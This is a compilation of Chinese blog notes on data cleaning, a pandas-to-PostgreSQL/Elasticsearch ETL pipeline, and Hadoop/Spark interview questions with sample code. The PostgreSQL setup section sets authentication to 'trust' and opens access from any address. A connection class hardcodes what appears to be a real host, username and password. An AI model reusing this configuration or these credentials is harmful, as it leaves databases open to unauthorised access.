格式内容问题是比较细节的问题，但很多分析失误都是栽在这个坑上，比如跨表关联或VLOOKUP失败（多个空格导致工具认为“陈丹奕”和“陈 丹奕”不是一个人）、统计值不全（数字里掺个字母当然求和时结果有问题）、模型输出失败或效果不好（数据对错列了，把日期和年龄混了，so……）。
因此，请各位务必注意这部分清洗工作，尤其是在处理的数据是人工收集而来，或者你确定产品前端校验设计不太好的时候……
第三步：逻辑错误清洗
这部分的工作是去掉一些使用简单逻辑推理就可以直接发现问题的数据，防止分析结果走偏。主要包含以下几个步骤：
1、去重
有的分析师喜欢把去重放在第一步，但我强烈建议把去重放在格式内容清洗之后，原因已经说过了（多个空格导致工具认为“陈丹奕”和“陈 丹奕”不是一个人，去重失败）。而且，并不是所有的重复都能这么简单的去掉……
当然，如果数据不是人工录入的，那么简单去重即可。
2、去除异常值 outliar
一句话就能说清楚：
有人填表时候手抖，年龄200岁，这种的就要么删掉，要么按缺失值处理。这种值如何发现？
一般有两种手段：

基于统计与数据分布

最大值，最小值，分箱，分类统计，Pandas Value count
峰值偏度，是不是正态分布。

箱形图分析


3、修正矛盾内容
有些字段是可以互相验证的，举例：身份证号是1101031980XXXXXXXX，然后年龄填18岁。在这种时候，需要根据字段的数据来源，来判定哪个字段提供的信息更为可靠，去除或重构不可靠的字段。
逻辑错误除了以上列举的情况，还有很多未列举的情况，在实际操作中要酌情处理。另外，这一步骤在之后的数据分析建模过程中有可能重复，因为即使问题很简单，也并非所有问题都能够一次找出，我们能做的是使用工具和方法，尽量减少问题出现的可能性，使分析过程更为高效。
第四步：非需求数据清洗
这一步说起来非常简单：把不要的字段删了。
但实际操作起来，有很多问题，例如：
把看上去不需要但实际上对业务很重要的字段删了；
某个字段觉得有用，但又没想好怎么用，不知道是否该删；
一时看走眼，删错字段了。
前两种情况我给的建议是：如果数据量没有大到不删字段就没办法处理的程度，那么能不删的字段尽量不删。第三种情况，请勤备份数据……
第五步：关联性验证
如果你的数据有多个来源，那么有必要进行关联性验证。
例如，你有汽车的线下购买信息，也有电话客服问卷信息，两者通过姓名和手机号关联，那么要看一下，同一个人线下登记的车辆信息和线上问卷问出来的车辆信息是不是同一辆，如果不是（别笑，业务流程设计不好是有可能出现这种问题的！），那么需要调整或去除数据。
严格意义上来说，这已经脱离数据清洗的范畴了，而且关联数据变动在数据库模型中就应该涉及。但我还是希望提醒大家，多个来源的数据整合是非常复杂的工作，一定要注意数据之间的关联性，尽量在分析过程中不要出现数据之间互相矛盾，而你却毫无察觉的情况。

数据采集建议

一行代码探索性数据分析
python Pandas Profiling 一行代码EDA 探索性数据分析

数据预处理
近年来，随着相关算法的日趋成熟，决定一个项目是否成功的关键因素逐渐从算法本身变成了“数据探索+数据预处理”这个部分。
有句话说的好：

数据和特征工程决定了学习的上限
模型和调参等只不过是竭尽所能去逼近这个上限

数据预处理的主要步骤：数据清理、数据集成、数据规约和数据变换。

参考文献
参考1：https://www.zhihu.com/question/22077960
参考3：https://zhuanlan.zhihu.com/p/20571505
参考4：https://zhuanlan.zhihu.com/p/54172870
https://blog.csdn.net/jiazericky/article/details/80322225
https://blog.csdn.net/walterudoing/article/details/51782704










文章大纲可视化处理的前置处理数据清洗使用pandas 对数据进行处理数据存储数据入库postgreSQL 安装数据入ESES 和 传统数据库  结构对比mapping大数据可视化非结构化数据可视化结构化数据可视化cubessuperset

可视化处理的前置处理
数据清洗
对于可视化的过程，拿到一份数据，我们首先要做的是进行数据清洗。我在这篇博文：数据清洗的目的，方法
介绍了数据清洗的一个通用步骤。

针对这个通用流程，我们 准备了一份医疗领域 的通用 样例数据，准备进行分析探查以及基本的可视化工作。


数据清洗小型 脚手架


es 目前支持sql



使用pandas 对数据进行处理
我在系列博文中：大数据ETL实践探索（5）---- 大数据ETL利器之 pandas 介绍了pandas 的部分使用。
通过文件加载，我们首先需要将文件中的数据转化为pandas 的dataframe ，
假设我们有一个脱密后的HIS数据

# 删除不需要的列
medicalTest_Delete_list= ["序号"]

medicalTest_str_list = [
"诊断编码(ICD编码)"
,"诊断名称"
,"出院小结"
,"出院小结"
,"医院科室"]

medicalTest_IntegerType_list = ["序号","实际住院天数"]

medicalTest_category_list = ["诊断编码(ICD编码)","诊断名称","医院科室"]

medicalTest_FloatType_list = ["基金支付金额","总金额"]
medicalTest_DateType_list = ["入院日期","出院日期"]

在线查看，本博客的样例 ：jupyter notebook 的 code
多说两句，发现这个jupyter notebook 的分享还挺神奇的，把github 地址粘贴到：https://nbviewer.jupyter.org/ 就可以了，每次展示有10分钟左右的延迟，如果强制刷新，生成的链接地址加上： ?flush_cache=true

数据存储
数据入库
postgreSQL 安装
最近单位在研究开源的数据库，说实话他的官方文档真是烂，中文的文档版本滞后，下载个CentOS 7 内核版本还要找半天：Linux downloads (Red Hat family)
yum install https://download.postgresql.org/pub/repos/yum/reporpms/EL-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm

yum install postgresql12

yum install postgresql12-server


# postgresql-12-setup initdb 命令不支持后跟参数设置编码，但是查官网init 又可以，很迷惑
/usr/pgsql-12/bin/postgresql-12-setup initdb 

systemctl enable postgresql-12
systemctl start postgresql-12


之前在一些虚机上安装时候发现，如果没有在开始时候指定字符集，那么后来修改会比较麻烦：
https://tutorials.technology/tutorials/How-to-change-postgresql-database-encoding-to-UTF8-from-SQL_ASCII.html
强烈建议阅读下文：字符集修改：字符集修改
其中提到，只要locale字符集正确，postgresql 默认字符集就ok ，



修改配置文件

修改登录及监听
修改配置文件（非常关键），操作如下:
cd /var/lib/pgsql/12/data/

首先，修改postgresql.conf，将 listen_addresses 这一行的ip地址改为  listen_addresses =’*’，代表监听所有端口，如果不改后面会出错。
其次，修改pg_hba.conf，将indent全部改为trust;
另外，pg_hba.conf的#IPv4 local connections 下添加一列：
host    all             all             0.0.0.0/0              md5      
#//这是由于每台远程机器的ip都不统一，pgadmin登录的时候ip不一致将无法连接数据

#之后重启服务。
systemctl restart postgresql-12


修改时区
# 查找配置文件目录
find / -name postgresql.conf
vi /var/lib/pgsql/12/data/postgresql.conf
# 找到此处并修改
timezone = 'Asia/Shanghai'



数据入库


# coding:utf-8

from sqlalchemy import create_engine

class connet_databases:
    def __init__(self):
        '''
        # 初始化数据库连接，使用pymysql模块
        # MySQL的用户：root, 密码:147369, 端口：3306,数据库：mydb
        '''
        
        _host = '39.108.131.88'
        _port = 3306
        _databases = 'san_jin_sq'  # 'produce' #

        _username = 'wuzaipei'
        _password = 'wuzaipei'

        self._connect = r'mysql+pymysql://{username}:{password}@{host}:{port}/{databases}'.format(
            username=_username,
            password=_password,
            host=_host,
            port=_port,
            databases=_databases)

engine = create_engine(connet_databases()._connect, echo=True)

数据入ES
es 权威指南
ES 和 传统数据库  结构对比

mapping
自动化创建mapping，虽然 es 可以动态推断es，但是不够准确，所以一般还是需要进行指定。
es mapping 文档
# 按照每一列的类型生成对应的 es index

def set_mapper_field(list_name,s_type,mapper):
    data = json.loads(json.dumps(mapper))
    for item in list_name:
        
        data['properties'][item] = {"type":s_type}
        
    return data
    
## 生成一个字典 进行字段对应

create_medicine_insurance_body = {
    "properties": {
        
    }
}

### 简单的将 数值型 与字符型调出来

dict_mapper = set_mapper_field(medicalTest_FloatType_list,'float',create_medicine_insurance_body)
dict_mapper = set_mapper_field(medicalTest_IntegerType_list,'integer',dict_mapper)
dict_mapper = set_mapper_field(medicalTest_category_list,'keyword',dict_mapper)
dict_mapper = set_mapper_field(medicalTest_str_list,'keyword',dict_mapper)

json_mapper = json.dumps(dict_mapper,ensure_ascii=False)


大数据可视化
大数据可视化的综合手段 如下图所示：最近刚出了一篇文章，我传到github 上面了：
大数据可视化技术及应用.pdf


非结构化数据可视化

kibana 文档特性
kibana 文档目录

非结构化数据的可视化，我们可以使用elastic search  配套的kibana 进行可视化 的绘制。
结构化数据可视化
cubes

cubes 官网
cubes 文档

superset
superset 官网
技术调研----BI工具对比及Surperset 之 docker安装与可视化










handoop相关知识点
1.Hadoop是什么？
Hadoop是一个由Apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。
Hadoop is a distributed computing platform written in Java. It incorporates features similar to those of the Google File System and of MapReduce. For some details, see HadoopMapReduce.
2.Hadoop框架最核心的设计是？
HDFS和MapReduce。HDFS为海量的数据提供了存储，则MapReduce为海量的数据提供了计算。
3.Hadoop的主要优点？
Hadoop的主要优点有以下几个：

(a) 高可靠性。Hadoop按位存储和处理数据的能力值得人们信赖。
(b)高扩展性。Hadoop是在可用的计算机集簇间分配数据并完成计算任务的，这些集簇可以方便地扩展到数以千计的节点中。
(c)高效性。Hadoop能够在节点之间动态地移动数据，并保证各个节点的动态平衡，因此处理速度非常快。
(d)高容错性。Hadoop能够自动保存数据的多个副本，并且能够自动将失败的任务重新分配。
(e)低成本。与一体机、商用数据仓库以及QlikView、Yonghong Z-Suite等数据集市相比，hadoop是开源的，项目的软件成本因此会大大降低。

4.HDFS是什么？
Hadoop实现了一个分布式文件系统（Hadoop Distributed File System），简称HDFS。
 
HDFS有高容错性的特点，并且设计用来部署在低廉的（low-cost）硬件上；而且它提供高吞吐量（high throughput）来访问应用程序的数据，适合那些有着超大数据集（large data set）的应用程序。HDFS放宽了（relax）POSIX的要求，可以以流的形式访问（streaming access）文件系统中的数据。
对外部客户机而言，HDFS就像一个传统的分级文件系统。可以创建、删除、移动或重命名文件，等等。但是 HDFS 的架构是基于一组特定的节点构建的，这是由它自身的特点决定的。
这些节点包括 NameNode（仅一个），它在 HDFS 内部提供元数据服务；DataNode，它为 HDFS 提供存储块。由于仅存在一个 NameNode，因此这是 HDFS 的一个缺点（单点失败）。 
存储在 HDFS 中的文件被分成块，然后将这些块复制到多个计算机中（DataNode）。这与传统的 RAID 架构大不相同。块的大小（通常为 64MB）和复制的块数量在创建文件时由客户机决定。NameNode 可以控制所有文件操作。HDFS 内部的所有通信都基于标准的 TCP/IP 协议。
HDFS的部分特性：
1.  一致性，高可用性，分区容错性 
2.  存储超大文件 
3.  一次写入，多次读取（流式数据访问） 
4.  运行在普通廉价的服务器上 
5.  以高延迟为代价 
6.  不适合存储大量小容量的文件 
7.  会在多个datanode上存储多份副本，默认3份，三份副本一般会保存在两个或者两个以上的服务器中 
8. namenode 负责管理文件目录，文件和block的对应关系以及block和datanode的对应关系 
9.  datanode负责存储，大部分的容错机制都是在datanode上实现
5、NameNode是什么？
NameNode 是一个通常在 HDFS 实例中的单独机器上运行的软件。 
它负责管理文件系统名称空间和控制外部客户机的访问。NameNode 决定是否将文件映射到 DataNode 上的复制块上。对于最常见的 3 个复制块，第一个复制块存储在同一机架的不同节点上，最后一个复制块存储在不同机架的某个节点上。
NameNode本身不可避免地具有SPOF（Single Point Of Failure）单点失效的风险，主备模式并不能解决这个问题，通过Hadoop Non-stop namenode才能实现100% uptime可用时间。
6.What is the purpose of the secondary name-node?
The term “secondary name-node” is somewhat misleading. It is not a name-node in the sense that data-nodes cannot connect to the secondary name-node, and in no event it can replace the primary name-node in case of its failure.
The only purpose of the secondary name-node is to perform periodic checkpoints. The secondary name-node periodically downloads current name-node image and edits log files, joins them into new image and uploads the new image back to the (primary and the only) name-node. See User Guide.
So if the name-node fails and you can restart it on the same physical node then there is no need to shutdown data-nodes, just the name-node need to be restarted. If you cannot use the old node anymore you will need to copy the latest image somewhere else. The latest image can be found either on the node that used to be the primary before failure if available; or on the secondary  
name-node. 
The latter will be the latest checkpoint without subsequent edits logs, that is the most recent name space modifications may be missing there. You will also need to restart the whole cluster in this case.
7. I have a new node I want to add to a running Hadoop cluster; how do I start services on just one node?
This also applies to the case where a machine has crashed and rebooted, etc, and you need to get it to rejoin the cluster. You do not need to shutdown and/or restart the entire cluster in this case. 
First, add the new node’s DNS name to the conf/slaves file on the master node. 
Then log in to the new slave node and execute:
$ cd path/to/hadoop
$ bin/hadoop-daemon.sh start datanode
$ bin/hadoop-daemon.sh start tasktracker
8. Is there an easy way to see the status and health of my cluster?
There are web-based interfaces to both the JobTracker (MapReduce master) and NameNode (HDFS master) which display status pages about the state of the entire system.  
By default, these are located at: 
http://job.tracker.addr:50030/ and http://name.node.addr:50070/.
The JobTracker status page will display the state of all nodes, as well as the job queue and status about all currently running jobs and tasks. TheNameNode status page will display the state of all nodes and the amount of free space, and provides the ability to browse the DFS via the web.
$ bin/hadoop dfsadmin -report
9、DataNode如何理解？
DataNode 也是一个通常在 HDFS实例中的单独机器上运行的软件。
Hadoop 集群包含一个 NameNode 和大量 DataNode。DataNode 通常以机架的形式组织，机架通过一个交换机将所有系统连接起来。Hadoop 的一个假设是：机架内部节点之间的传输速度快于机架间节点的传输速度。
DataNode 响应来自 HDFS 客户机的读写请求。它们还响应来自 NameNode 的创建、删除和复制块的命令。NameNode 依赖来自每个 DataNode 的定期心跳（heartbeat）消息。每条消息都包含一个块报告，NameNode 可以根据这个报告验证块映射和其他文件系统元数据。如果 DataNode 不能发送心跳消息，NameNode 将采取修复措施，重新复制在该节点上丢失的块。
10、如何理解Google集群系统原型？
Google的数据中心使用廉价的Linux PC机组成集群，在上面运行各种应用。核心组件是3个：

(a) GFS（Google File System）。一个分布式文件系统，隐藏下层负载均衡，冗余复制等细节，对上层程序提供一个统一的文件系统API接口。Google根据自己的需求对它进行了特别优化，包括：超大文件的访问，读操作比例远超过写操作，PC机极易发生故障造成节点失效等。GFS把文件分成64MB的块，分布在集群的机器上，使用Linux的文件系统存放。同时每块文件至少有3份以上的冗余。中心是一个Master节点，根据文件索引，找寻文件块。详见Google的工程师发布的GFS论文。
(b) MapReduce。Google发现大多数分布式运算可以抽象为MapReduce操作。Map是把输入Input分解成中间的Key/Value对，Reduce把Key/Value合成最终输出Output。这两个函数由程序员提供给系统，下层设施把Map和Reduce操作分布在集群上运行，并把结果存储在GFS上。
(c) BigTable。一个大型的分布式数据库，这个数据库不是关系式的数据库。像它的名字一样，就是一个巨大的表格，用来存储结构化的数据。

11、Hadoop生态圈子项目有哪些？
(a)HDFS: Hadoop分布式文件系统(Distributed File System)  
(b)MapReduce：MapReduce是处理大量半结构化数据集合的编程模型 
(c)HBase: 类似Google BigTable的分布式NoSQL列数据库。 
(d)Hive：数据仓库工具，由Facebook贡献。 
(e)Zookeeper：分布式锁设施，提供类似Google Chubby的功能，由Facebook贡献。 
(f)Avro：新的数据序列化格式与传输工具，将逐步取代Hadoop原有的IPC机制。 
(g)Pig: 大数据分析平台，为用户提供多种接口。 
(h)Ambari：Hadoop管理工具，可以快捷的监控、部署、管理集群。 
(i)Sqoop：于在HADOOP与传统的数据库间进行数据的传递。
12、Hadoop1.x与Hadoop2.x的区别？
Hadoop2.x中有两个重要的变更：
(a)HDFS的NameNode可以以集群的方式部署，增强了NameNode的水平扩展能力和可用性 
(b)MapReduce将JobTrack中的资源管理及任务生命周期管理（包括定时触发及监控），拆分成两个独立的组件，并更名为YARN
13、Hadoop2.x解决了Hadoop1.x中的哪些问题
(a)2.x解决了1.x中的namenode单点故障问题 
(b)解决了namenode内存压力过大难以扩展问题 
(c)解决了JobTrack单点故障问题 
(d)解决了JobTrack访问压力过大问题 
(e)解决了对MapReduce之外的框架支持问题
Hadoop例题—-填空篇
1.在数据分析与挖掘中对数据的访问性要求包括：交互性访问、____、迭代计算、_____，HADOOP仅仅支持了其中____，而Spark则支持所有4种方式。
2.2004年Google发表的三篇著名的分布式论文是关于分布式计算、_分布式数据库、分布式文件系统，分别对应的开源实现是____mapreduce_、BIGTABLE__、_GFS_______。
3.HDFS的默认文件会存储____3份，如果有三台HDFS节点，有两台机器宕机的情况下文件会丢失吗？不会
4.HDFS中Master 进程叫_， Slaves进程叫_____。
Hadoop例题—-问答篇
1.解释MapReduce中的Partition和Shuffle？
在MapReduce过程中需要将任务进行分片，Shuffle:是描述数据从map端输入到reduce的过程,在hadoop中,
 大部分map task和reducetask是在不同的node执行,重要开销是网络开销和磁盘IO开销, 
 因此,shuffle的作用主要是:完整的从map task端传输到reduce端;跨节点传输数据时,尽可能的减少对带宽的消耗

2.请列出你所知道的大数据应用的中间件及用途，例如 hdfs 分布式文件系统？
(a)  Hdfs是广泛使用的hadoop生态圈中的 分布式文件系统，很多其他组件都是依赖于hdfs进行实现，比如hadoop 的map reduce算法，hbase。
HDFS就像一个传统的分级文件系统。可以创建、删除、移动或重命名文件
HDFS: Hadoop分布式文件系统(Distributed File System) 

Spark的rdd也是一个非常有用的中间件，它为spark各类组件提供在内存中表示数据的基本存储格式。
(b)MapReduce：MapReduce是处理大量半结构化数据集合的编程模型
(c)HBase: 类似Google BigTable的分布式NoSQL列数据库。
(d)Hive：数据仓库工具，由Facebook贡献。
(e)Zookeeper：分布式锁设施，提供类似Google Chubby的功能，由Facebook贡献。

Hadoop例题—-上机操作
HDFS基本操作 
- 拷贝文件到HDFS 
- 考出文件到本地文件系统 
- 修改文件目录权限 
- HDFS NameNode/DataNode Web监控 
例题： 
1. 请按以下要求运行hadoop 自带的wordcount程序  
     a) 将输入文件wordcount1.txt和wordcount2.txt 拷贝到hdfs 的/input/ 
     b) 修改文件的权限为777 
     c）运行wordcount 的hadoop sample程序统计wordcount1.txt和wordcount2.txt 合计出现的单词个数 
     d）将输出结果拷贝到本地文件系统，答印结果. 
     e）将hdfs上的输出文件夹out删除
hadoop fs -copyFromLocal /data/wordcount/* /input/
hadoop fs -chmod 777 /input
hadoop jar hadoop-mapreduce-examples-2.7.2.jar wordcount /input /out
hadoop fs -copyToLocal /out /data/ 









Spark相关知识点
1.Spark基础知识
1.Spark是什么？
UCBerkeley AMPlab所开源的类HadoopMapReduce的通用的并行计算框架
dfsSpark基于mapreduce算法实现的分布式计算，拥有HadoopMapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS，因此Spark能更好地适用于数据挖掘与机器学习等需要迭代的map reduce的算法。
2.Spark与Hadoop的对比（Spark的优势）
1、Spark的中间数据放到内存中，对于迭代运算效率更高 
2、Spark比Hadoop更通用 
3、Spark提供了统一的编程接口 
4、容错性– 在分布式数据集计算时通过checkpoint来实现容错 
5、可用性– Spark通过提供丰富的Scala, Java，Python API及交互式Shell来提高可用性
3.Spark有那些组件
1、Spark Streaming：支持高吞吐量、支持容错的实时流数据处理 
2、Spark SQL， Data frames: 结构化数据查询 
3、MLLib：Spark 生态系统里用来解决大数据机器学习问题的模块 
4、GraphX是构建于Spark上的图计算模型 
5、SparkR是一个R语言包，它提供了轻量级的方式使得可以在R语言中使用 Spark

2.DataFrame相关知识点
1.DataFrame是什么？
DataFrame是一种以RDD为基础的分布式数据集，类似于传统数据库中的二维表格。
2.DataFrame与RDD的主要区别在于？
DataFrame带有schema元信息，即DataFrame所表示的二维表数据集的每一列都带有名称和类型。这使得SparkSQL得以洞察更多的结构信息，从而对藏于DataFrame背后的数据源以及作用于DataFrame之上的变换进行了针对性的优化，最终达到大幅提升运行时效率的目标。反观RDD，由于无从得知所存数据元素的具体内部结构，Spark Core只能在stage层面进行简单、通用的流水线优化。
3.DataFrame 特性
1、支持从KB到PB级的数据量 
2、支持多种数据格式和多种存储系统 
3、通过Catalyst优化器进行先进的优化生成代码 
4、通过Spark无缝集成主流大数据工具与基础设施 
5、API支持Python、Java、Scala和R语言

3.RDD相关知识点
1.RDD，全称为？
Resilient Distributed Datasets，意为容错的、并行的数据结构，可以让用户显式地将数据存储到磁盘和内存中，并能控制数据的分区。同时，RDD还提供了一组丰富的操作来操作这些数据。
2.RDD的特点？

它是在集群节点上的不可变的、已分区的集合对象。
通过并行转换的方式来创建如(map, filter, join, etc)。
失败自动重建。
可以控制存储级别(内存、磁盘等)来进行重用。
必须是可序列化的。
是静态类型的。

3.RDD核心概念
Client：客户端进程，负责提交作业到Master。 
Master:Standalone模式中主控节点，负责接收Client提交的作业，管理Worker，并命令Worker启动分配Driver的资源和启动Executor的资源。 
Worker：Standalone模式中slave节点上的守护进程，负责管理本节点的资源，定期向Master汇报心跳，接收Master的命令，启动Driver和Executor。 
Driver： 一个Spark作业运行时包括一个Driver进程，也是作业的主进程，负责作业的解析、生成Stage并调度Task到Executor上。包括DAGScheduler，TaskScheduler。 
Executor：即真正执行作业的地方，一个集群一般包含多个Executor，每个Executor接收Driver的命令Launch Task，一个Executor可以执行一到多个Task。
4.RDD常见术语
DAGScheduler： 实现将Spark作业分解成一到多个Stage，每个Stage根据RDD的Partition个数决定Task的个数，然后生成相应的Task set放到TaskScheduler中。 
TaskScheduler：实现Task分配到Executor上执行。 
Task：运行在Executor上的工作单元 
Job：SparkContext提交的具体Action操作，常和Action对应 
Stage：每个Job会被拆分很多组任务（task），每组任务被称为Stage，也称TaskSet 
RDD：Resilient Distributed Datasets的简称，弹性分布式数据集，是Spark最核心的模块和类 
Transformation/Action：SparkAPI的两种类型；Transformation返回值还是一个RDD，Action返回值不少一个RDD，而是一个Scala的集合；所有的Transformation都是采用的懒策略，如果只是将Transformation提交是不会执行计算的，计算只有在Action被提交时才会被触发。 
DataFrame： 带有Schema信息的RDD，主要是对结构化数据的高度抽象。 
DataSet：结合了DataFrame和RDD两者的优势，既允许用户很方便的操作领域对象，又具有SQL执行引擎的高效表现。
5.RDD提供了两种类型的操作
transformation和action 
1，transformation是得到一个新的RDD，方式很多，比如从数据源生成一个新的RDD，从RDD生成一个新的RDD 
2，action是得到一个值，或者一个结果（直接将RDD cache到内存中） 
3，所有的transformation都是采用的懒策略，就是如果只是将transformation提交是不会执行计算的，计算只有在action被提交的时候才被触发
6.RDD中关于转换(transformation)与动作(action)的区别
transformation会生成新的RDD，而后者只是将RDD上某项操作的结果返回给程序，而不会生成新的RDD；无论执行了多少次transformation操作，RDD都不会真正执行运算（记录lineage），只有当action操作被执行时，运算才会触发。
7.RDD 与 DSM的最大不同是?
DSM(distributed shared memory) 
RDD只能通过粗粒度转换来创建，而DSM则允许对每个内存位置上数据的读和写。在这种定义下，DSM不仅包括了传统的共享内存系统，也包括了像提供了共享 DHT(distributed hash table) 的 Piccolo 以及分布式数据库等。
8.RDD的优势？
1、高效的容错机制 
2、结点落后问题的缓和 (mitigate straggler) ：  
3、批量操作： 
4、优雅降级 (degrade gracefully) 
9.如何获取RDD?
1、从共享的文件系统获取，（如：HDFS） 
2、通过已存在的RDD转换 
3、将已存在scala集合（只要是Seq对象）并行化 ，通过调用SparkContext的parallelize方法实现 
4、改变现有RDD的之久性；RDD是懒散，短暂的。
10.RDD都需要包含以下四个部分
a.源数据分割后的数据块，源代码中的splits变量 
b.关于“血统”的信息，源码中的dependencies变量 
c.一个计算函数（该RDD如何通过父RDD计算得到），源码中的iterator(split)和compute函数 
d.一些关于如何分块和数据存放位置的元信息，如源码中的partitioner和preferredLocations0
11.RDD中将依赖的两种类型
窄依赖(narrowdependencies)和宽依赖(widedependencies)。 
窄依赖是指父RDD的每个分区都只被子RDD的一个分区所使用。相应的，那么宽依赖就是指父RDD的分区被多个子RDD的分区所依赖。例如，map就是一种窄依赖，而join则会导致宽依赖 
依赖关系分类的特性： 
第一，窄依赖可以在某个计算节点上直接通过计算父RDD的某块数据计算得到子RDD对应的某块数据； 
第二，数据丢失时，对于窄依赖只需要重新计算丢失的那一块数据来恢复； 
Spark Streaming相关知识点 
1.Spark Streaming的基本原理 
Spark Streaming的基本原理是将输入数据流以时间片（秒级）为单位进行拆分，然后以类似批处理的方式处理每个时间片数据
RDD 基本操作
常见的聚合操作
count(*) 所有值不全为NULL时，加1操作 
count(1) 不管有没有值，只要有这条记录，值就加1 
count(col) col列里面的值为null，值不会加1，这个列里面的值不为NULL，才加1

sum求和
sum(可转成数字的值） 返回bigint 
avg求平均值
avg（可转成数字的值）返回double 
distinct不同值个数
count(distinct col)

按照某些字段排序
select col1,other... from table where conditio order by col1,col2 [asc|desc] 

Join表连接
join等值连接（内连接），只有某个值在m和n中同时存在时。
left outer join 左外连接，左边表中的值无论是否在b中存在时，都输出；右边表中的值，只有在左边表中存在时才输出。
right outer join 和 left outer join 相反。 


Transformation具体内容：

reduceByKey(func,  [numTasks]) : 在一个（K，V)对的数据集上使用，返回一个（K，V）对的数据集，key相同的值，都被使用指定的reduce函数聚合到一起。和groupbykey类似，任务的个数是可以通过第二个可选参数来配置的。
join(otherDataset,  [numTasks]) :在类型为（K,V)和（K,W)类型的数据集上调用，返回一个（K,(V,W))对，每个key中的所有元素都在一起的数据集
groupWith(otherDataset,  [numTasks]) : 在类型为（K,V)和(K,W)类型的数据集上调用，返回一个数据集，组成元素为（K, Seq[V], Seq[W]) Tuples。这个操作在其它框架，称为CoGroup
cartesian(otherDataset) : 笛卡尔积。但在数据集T和U上调用时，返回一个(T，U）对的数据集，所有元素交互进行笛卡尔积。
flatMap(func) :类似于map，但是每一个输入元素，会被映射为0到多个输出元素（因此，func函数的返回值是一个Seq，而不是单一元素）

Case 1将一个list乘方后输出
  val input = sc.parallelize(List(1,2,3,4))
  val result = input.map(x => x*x)
  println(result.collect().mkString(","))


Case 2 wordcount
  val textFile = sc.textFile(args(1))  
 val result = textFile.flatMap(line => line.split("\\s+")).map(word => (word, 1)).reduceByKey(_ + _)
 println(result.collect().mkString(","))
 result.saveAsTextFile(args(2)) 

Case 3 打印rdd的元素
rdd.foreach(println) 或者 rdd.map(println).
rdd.collect().foreach(println）
rdd.take(100).foreach(println）
spark SQL
val bankText = sc.textFile("/bank-full.csv")
case class Bank(age:Integer,job:String,marital:String,education:String,balance:Integer)
val bank = bankText.map(s=>s.split(";")).filter(s=>s(0)!="\"age\"").map(
    s=>Bank(s(0).toInt,
    s(1).replaceAll("\"",""),
    s(2).replaceAll("\"",""),
    s(3).replaceAll("\"",""),
    s(5).replaceAll("\"","").toInt
)
)
bank.toDF().registerTempTable("bank")
bank.toDF.select("*").show()
统计婚姻状况人数


val df  = bank.toDF()
val num = df.groupBy(df("marital")).count()
num.show()
统计单身人数
val single = df.filter(df("marital").equalTo("single")).count()
println("The number of single:"+single)
12.Spark Streaming优劣
优势： 
1、统一的开发接口 
2、吞吐和容错 
3、多种开发范式混用，Streaming + SQL, Streaming +MLlib 
4、利用Spark内存pipeline计算 
劣势： 
微批处理模式，准实时 
 
 
 
 
Storm结构： 
 
DStream 
1.将流式计算分解成一系列确定并且较小的批处理作业 
2.将失败或者执行较慢的任务在其它节点上并行执行 
执行的最小单元为RDD的partition 
3.较强的容错能力
spark stream example code

nc -lk 9999

import org.apache.spark._
import org.apache.spark.streaming._
import org.apache.spark.streaming.StreamingContext._
val conf = new SparkConf().setMaster("local[2]").setAppName("NetWork")
val ssc = new StreamingContext(conf,Seconds(100))
val lines = ssc.socketTextStream("localhost",9999)
val words  = lines.flatMap(_.split(" "))
val pairs = words.map(word=>(word,1))
val wordCounts = pairs.reduceByKey(_+_)
wordCounts.print()
ssc.start()
ssc.awaitTermination()


4.日志系统
1.Flume
Flume是一个分布式的日志收集系统 
，具有高可靠、高可用、事务管理、失败重启等功能。数据处理速度快，完全可以用于生产环境。 
Flume的核心是agent。 
Agent是一个java进程，运行在日志收集端，通过agent接收日志，然后暂存起来，再发送到目的地。 
Agent里面包含3个核心组件：source、channel、sink。 
Source组件是专用于收集日志的，可以处理各种类型各种格式的日志数据,包括avro、thrift、exec、jms、spoolingdirectory、netcat、sequencegenerator、syslog、http、legacy、自定义。source组件把数据收集来以后，临时存放在channel中。 
Channel组件是在agent中专用于临时存储数据的，可以存放在memory、jdbc、file、自定义。channel中的数据只有在sink发送成功之后才会被删除。 
Sink组件是用于把数据发送到目的地的组件，目的地包括hdfs、logger、avro、thrift、ipc、file、null、hbase、solr、自定义。 
Apache Kafka是分布式发布-订阅消息系统。 
它最初由LinkedIn公司开发，之后成为Apache项目的一部分。Kafka是一种快速、可扩展的、设计内在就是分布式的，分区的和可复制的提交日志服务。
Apache Kafka与传统消息系统相比，有以下不同：
1、它被设计为一个分布式系统，易于向外扩展； 
2、它同时为发布和订阅提供高吞吐量； 
3、它支持多订阅者，当失败时能自动平衡消费者； 
4、它将消息持久化到磁盘，因此可用于批量消费

5.分布式搜索
搜索引擎是什么？
搜索引擎是指根据一定的策略、运用特定的计算机程序从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务，将用户检索相关的信息展示给用户的系统。搜索引擎包括全文索引、目录索引、元搜索引擎、垂直搜索引擎、集合式搜索引擎、门户搜索引擎与免费链接列表等。
Lucene是什么？
Lucene一个高性能、可伸缩的信息搜索库，即它不是一个完整的全文检索引擎，而是一个全检索引擎的架构，提供了完整的查询引擎和索引引擎，部分文本分析引擎。
Elasticsearch是什么？
Elasticsearch一个高可扩展的开源的全文本搜索和分析工具。 
它允许你以近实时的方式快速存储、搜索、分析大容量的数据。Elasticsearch是一个基于ApacheLucene(TM)的开源搜索引擎。无论在开源还是专有领域，Lucene可以被认为是迄今为止最先进、性能最好的、功能最全的搜索引擎库。 
ElasticSearch 有4中方式来构建数据库 
最简单的方法是使用indexAPI，将一个Document发送到特定的index，一般通过curltools实现。 
第二第三种方法是通过bulkAPI和UDPbulkAPI。两者的区别仅在于连接方式。 
第四种方式是通过一个插件-river。river运行在ElasticSearch上，并且可以从外部数据库导入数据到ES中。需要注意的是，数据构建仅在分片上进行，而不能在副本上进行。 
ELK是一套常用的开源日志监控和分析系统 
包括一个分布式索引与搜索服务Elasticsearch，一个管理日志和事件的工具logstash，和一个数据可视化服务Kibana 
logstash                负责日志的收集，处理和储存 
elasticsearch        负责日志检索和分析 
Kibana                  负责日志的可视化

6.分布式数据库
1hive
1.Hive是什么？
Hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供类SQL查询功能。本质是将HQL转换为MapReduce程序
2.Hive的设计目标？
